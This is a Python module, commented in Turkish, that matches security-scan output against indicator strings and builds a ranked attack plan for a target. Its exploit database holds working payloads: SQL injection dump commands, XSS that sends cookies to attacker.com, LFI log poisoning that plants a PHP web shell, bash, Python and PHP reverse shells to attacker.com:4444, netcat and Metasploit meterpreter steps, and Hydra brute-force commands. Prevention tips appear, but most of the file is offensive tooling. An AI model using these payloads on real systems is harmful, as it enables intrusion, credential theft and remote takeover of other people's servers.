#!/usr/bin/env python3
"""
Vulnerability Analyzer and Attack Advisory System
Zafiyet tespiti ve saldırı önerileri modülü
"""

from typing import Dict, List, Any, Optional
import re
import json
from datetime import datetime

class VulnerabilityAnalyzer:
    """Zafiyet analizi ve exploit önerisi sistemi"""
    
    def __init__(self):
        self.vulnerability_database = self._load_vulnerability_db()
        self.exploit_database = self._load_exploit_db()
        self.attack_patterns = self._load_attack_patterns()
    
    def _load_vulnerability_db(self) -> Dict:
        """Yaygın zafiyet veritabanı"""
        return {
            # WEB VULNERABILITIES
            "sql_injection": {
                "name": "SQL Injection",
                "severity": "Critical",
                "cvss": 9.8,
                "description": "Veritabanı sorgularına kötü amaçlı SQL kodu enjekte edilebilir",
                "indicators": [
                    "error in your SQL syntax",
                    "mysql_fetch_array",
                    "ORA-01756",
                    "Microsoft OLE DB Provider for SQL Server",
                    "PostgreSQL query failed",
                    "warning: mysql_"
                ],
                "attack_vector": "Web Forms, URL Parameters",
                "impact": "Veritabanı içeriğinin çalınması, değiştirilmesi veya silinmesi"
            },
            
            "xss": {
                "name": "Cross-Site Scripting (XSS)",
                "severity": "High",
                "cvss": 7.5,
                "description": "Kullanıcı tarayıcısında kötü amaçlı JavaScript kodu çalıştırılabilir",
                "indicators": [
                    "<script>alert",
                    "document.cookie",
                    "onerror=",
                    "onclick=",
                    "javascript:",
                    "data:text/html"
                ],
                "attack_vector": "Input Fields, Comments, Search Boxes",
                "impact": "Session hijacking, cookie theft, defacement"
            },
            
            "lfi": {
                "name": "Local File Inclusion",
                "severity": "High",
                "cvss": 7.5,
                "description": "Sunucudaki yerel dosyalar okunabilir",
                "indicators": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32",
                    "file=",
                    "page=",
                    "include=",
                    "Warning: include("
                ],
                "attack_vector": "URL Parameters, File Upload",
                "impact": "Sensitive file disclosure, source code exposure"
            },
            
            "rce": {
                "name": "Remote Code Execution",
                "severity": "Critical",
                "cvss": 10.0,
                "description": "Sunucuda uzaktan kod çalıştırılabilir",
                "indicators": [
                    "eval()",
                    "system()",
                    "exec()",
                    "shell_exec()",
                    "${IFS}",
                    "cmd.exe"
                ],
                "attack_vector": "Command Injection Points",
                "impact": "Complete system compromise"
            },
            
            # NETWORK VULNERABILITIES
            "open_ports": {
                "name": "Unnecessary Open Ports",
                "severity": "Medium",
                "cvss": 5.0,
                "description": "Gereksiz açık portlar saldırı yüzeyini artırır",
                "indicators": [
                    "21/tcp open",  # FTP
                    "23/tcp open",  # Telnet
                    "445/tcp open", # SMB
                    "3389/tcp open", # RDP
                    "1433/tcp open", # MSSQL
                    "3306/tcp open"  # MySQL
                ],
                "attack_vector": "Network Services",
                "impact": "Unauthorized access, information disclosure"
            },
            
            "weak_ssl": {
                "name": "Weak SSL/TLS Configuration",
                "severity": "Medium",
                "cvss": 5.3,
                "description": "Zayıf SSL/TLS konfigürasyonu",
                "indicators": [
                    "SSLv2",
                    "SSLv3",
                    "TLSv1.0",
                    "RC4",
                    "DES",
                    "MD5"
                ],
                "attack_vector": "HTTPS Connection",
                "impact": "Man-in-the-middle attacks, data interception"
            },
            
            "default_credentials": {
                "name": "Default Credentials",
                "severity": "Critical",
                "cvss": 9.0,
                "description": "Varsayılan kullanıcı adı ve şifreler kullanılıyor",
                "indicators": [
                    "admin:admin",
                    "admin:password",
                    "root:root",
                    "sa:sa",
                    "tomcat:tomcat",
                    "oracle:oracle"
                ],
                "attack_vector": "Login Pages, Admin Panels",
                "impact": "Complete system access"
            }
        }
    
    def _load_exploit_db(self) -> Dict:
        """Exploit önerileri veritabanı"""
        return {
            "sql_injection": {
                "tools": ["sqlmap", "havij", "jSQL Injection"],
                "manual_test": {
                    "basic": "' OR '1'='1",
                    "union": "' UNION SELECT null,null,null--",
                    "blind": "' AND 1=1--",
                    "time_based": "' AND SLEEP(5)--"
                },
                "sqlmap_command": "sqlmap -u '{url}' --batch --forms --crawl=2 --level=3 --risk=2",
                "prevention": "Use parameterized queries, input validation, least privilege",
                "example_attack": """
# 1. Basic SQL Injection Test
curl "{target}/login.php?username=admin' OR '1'='1&password=test"

# 2. Using SQLMap for automated exploitation
sqlmap -u "{target}/page.php?id=1" --dbs --batch
sqlmap -u "{target}/page.php?id=1" -D database_name --tables
sqlmap -u "{target}/page.php?id=1" -D database_name -T users --dump

# 3. Manual extraction
{target}/page.php?id=1' UNION SELECT 1,database(),3--
{target}/page.php?id=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
                """
            },
            
            "xss": {
                "tools": ["XSStrike", "XSSer", "BeEF"],
                "manual_test": {
                    "basic": "<script>alert('XSS')</script>",
                    "img": "<img src=x onerror=alert('XSS')>",
                    "svg": "<svg onload=alert('XSS')>",
                    "event": "javascript:alert('XSS')"
                },
                "xsstrike_command": "xsstrike -u '{url}' --crawl",
                "prevention": "Output encoding, Content Security Policy, input validation",
                "example_attack": """
# 1. Reflected XSS Test
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

# 2. Stored XSS Payload
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal', true);
xhr.send('cookies=' + document.cookie + '&url=' + window.location);
</script>

# 3. DOM-based XSS
#<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# 4. Using XSStrike
xsstrike -u "{target}/search.php?q=test" --crawl --params
                """
            },
            
            "lfi": {
                "tools": ["fimap", "LFISuite", "Burp Suite"],
                "manual_test": {
                    "linux": "../../../etc/passwd",
                    "windows": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "php_filter": "php://filter/convert.base64-encode/resource=index.php",
                    "log_poisoning": "../../../var/log/apache2/access.log"
                },
                "command": "fimap -u '{url}?file=test.txt'",
                "prevention": "Input validation, use whitelists, disable dangerous functions",
                "example_attack": """
# 1. Basic LFI
{target}/index.php?page=../../../etc/passwd
{target}/index.php?page=....//....//....//etc/passwd

# 2. PHP Wrapper Exploitation
{target}/index.php?page=php://filter/convert.base64-encode/resource=config.php
{target}/index.php?page=php://input
{target}/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>

# 3. Log Poisoning
# First poison the log
curl "{target}" -H "User-Agent: <?php system($_GET['cmd']); ?>"
# Then include the log
{target}/index.php?page=../../../var/log/apache2/access.log&cmd=whoami

# 4. Session File Inclusion
{target}/index.php?page=../../../tmp/sess_[PHPSESSID]
                """
            },
            
            "rce": {
                "tools": ["Metasploit", "commix", "PowerShell Empire"],
                "manual_test": {
                    "linux": "; id; whoami; pwd",
                    "windows": "& whoami & dir",
                    "php": "<?php system($_GET['cmd']); ?>",
                    "python": "__import__('os').system('id')"
                },
                "metasploit_module": "use exploit/multi/http/",
                "prevention": "Input validation, use safe APIs, principle of least privilege",
                "example_attack": """
# 1. Command Injection
{target}/ping.php?ip=127.0.0.1; cat /etc/passwd
{target}/ping.php?ip=127.0.0.1 | nc attacker.com 4444 -e /bin/bash

# 2. Reverse Shell Payloads
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 3. Using Metasploit
msfconsole
use exploit/multi/script/web_delivery
set payload php/meterpreter/reverse_tcp
set LHOST attacker.com
set LPORT 4444
exploit
                """
            },
            
            "default_credentials": {
                "tools": ["Hydra", "Medusa", "Ncrack"],
                "common_defaults": {
                    "tomcat": "tomcat:tomcat, admin:admin",
                    "mysql": "root:(blank), root:root",
                    "postgresql": "postgres:postgres",
                    "ssh": "root:toor, admin:admin",
                    "ftp": "anonymous:(blank), ftp:ftp"
                },
                "hydra_command": "hydra -L users.txt -P passwords.txt {target} {service}",
                "prevention": "Change default passwords, use strong passwords, implement account lockout",
                "example_attack": """
# 1. Brute Force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"

# 2. SSH Brute Force
hydra -L users.txt -P passwords.txt ssh://{target}

# 3. FTP Brute Force
hydra -l admin -P passwords.txt ftp://{target}

# 4. MySQL Brute Force
hydra -l root -P passwords.txt mysql://{target}

# 5. Using Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS {target}
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
                """
            }
        }
    
    def _load_attack_patterns(self) -> Dict:
        """Saldırı desenleri ve metodolojileri"""
        return {
            "web_application": {
                "methodology": [
                    "1. Information Gathering (Recon)",
                    "2. Vulnerability Scanning",
                    "3. Manual Testing",
                    "4. Exploitation",
                    "5. Post-Exploitation",
                    "6. Reporting"
                ],
                "tools_sequence": [
                    "nmap → nikto → dirb → sqlmap → metasploit"
                ]
            },
            "network": {
                "methodology": [
                    "1. Network Discovery",
                    "2. Port Scanning",
                    "3. Service Enumeration",
                    "4. Vulnerability Assessment",
                    "5. Exploitation",
                    "6. Privilege Escalation"
                ],
                "tools_sequence": [
                    "netdiscover → nmap → enum4linux → searchsploit → metasploit"
                ]
            }
        }
    
    def analyze_scan_results(self, scan_output: str) -> List[Dict]:
        """Tarama sonuçlarını analiz et ve zafiyetleri tespit et"""
        vulnerabilities = []
        
        # Check each vulnerability pattern
        for vuln_key, vuln_data in self.vulnerability_database.items():
            for indicator in vuln_data["indicators"]:
                if indicator.lower() in scan_output.lower():
                    vulnerabilities.append({
                        "type": vuln_key,
                        "name": vuln_data["name"],
                        "severity": vuln_data["severity"],
                        "cvss": vuln_data["cvss"],
                        "description": vuln_data["description"],
                        "impact": vuln_data["impact"],
                        "indicator_found": indicator
                    })
                    break
        
        return vulnerabilities
    
    def get_exploit_recommendations(self, vulnerability_type: str) -> Dict:
        """Zafiyet tipine göre exploit önerileri getir"""
        if vulnerability_type in self.exploit_database:
            return self.exploit_database[vulnerability_type]
        return None
    
    def generate_attack_plan(self, vulnerabilities: List[Dict]) -> Dict:
        """Tespit edilen zafiyetlere göre saldırı planı oluştur"""
        attack_plan = {
            "priority_targets": [],
            "recommended_tools": set(),
            "step_by_step": [],
            "commands": [],
            "prevention_measures": []
        }
        
        # Sort vulnerabilities by CVSS score
        sorted_vulns = sorted(vulnerabilities, key=lambda x: x.get("cvss", 0), reverse=True)
        
        for i, vuln in enumerate(sorted_vulns, 1):
            vuln_type = vuln["type"]
            exploit_info = self.get_exploit_recommendations(vuln_type)
            
            if exploit_info:
                attack_plan["priority_targets"].append({
                    "priority": i,
                    "vulnerability": vuln["name"],
                    "severity": vuln["severity"],
                    "exploit_difficulty": "Low" if vuln["cvss"] > 7 else "Medium"
                })
                
                attack_plan["recommended_tools"].update(exploit_info["tools"])
                
                attack_plan["step_by_step"].append({
                    "step": i,
                    "target": vuln["name"],
                    "description": f"Exploit {vuln['name']} vulnerability",
                    "manual_test": exploit_info.get("manual_test", {}),
                    "automated_tool": exploit_info["tools"][0] if exploit_info["tools"] else None
                })
                
                if "sqlmap_command" in exploit_info:
                    attack_plan["commands"].append(exploit_info["sqlmap_command"])
                elif "hydra_command" in exploit_info:
                    attack_plan["commands"].append(exploit_info["hydra_command"])
                
                attack_plan["prevention_measures"].append(exploit_info.get("prevention", ""))
        
        return attack_plan
    
    def generate_detailed_report(self, scan_results: str, target: str) -> Dict:
        """Detaylı zafiyet raporu ve saldırı planı oluştur"""
        # Analyze vulnerabilities
        vulnerabilities = self.analyze_scan_results(scan_results)
        
        # Generate attack plan
        attack_plan = self.generate_attack_plan(vulnerabilities)
        
        # Create detailed report
        report = {
            "target": target,
            "scan_date": datetime.now().isoformat(),
            "total_vulnerabilities": len(vulnerabilities),
            "critical_count": len([v for v in vulnerabilities if v["severity"] == "Critical"]),
            "high_count": len([v for v in vulnerabilities if v["severity"] == "High"]),
            "vulnerabilities": vulnerabilities,
            "attack_plan": attack_plan,
            "risk_score": self._calculate_risk_score(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
        
        return report
    
    def _calculate_risk_score(self, vulnerabilities: List[Dict]) -> float:
        """Risk skoru hesapla (0-100)"""
        if not vulnerabilities:
            return 0
        
        total_cvss = sum(v.get("cvss", 0) for v in vulnerabilities)
        max_possible = len(vulnerabilities) * 10
        
        return min(100, (total_cvss / max_possible) * 100)
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Güvenlik önerileri oluştur"""
        recommendations = []
        
        vuln_types = set(v["type"] for v in vulnerabilities)
        
        if "sql_injection" in vuln_types:
            recommendations.append("Implement parameterized queries and input validation")
        if "xss" in vuln_types:
            recommendations.append("Enable Content Security Policy (CSP) and output encoding")
        if "weak_ssl" in vuln_types:
            recommendations.append("Update SSL/TLS configuration to use TLS 1.2+")
        if "default_credentials" in vuln_types:
            recommendations.append("Change all default passwords immediately")
        if "open_ports" in vuln_types:
            recommendations.append("Close unnecessary ports and services")
        
        return recommendations

# Global analyzer instance
vulnerability_analyzer = VulnerabilityAnalyzer()
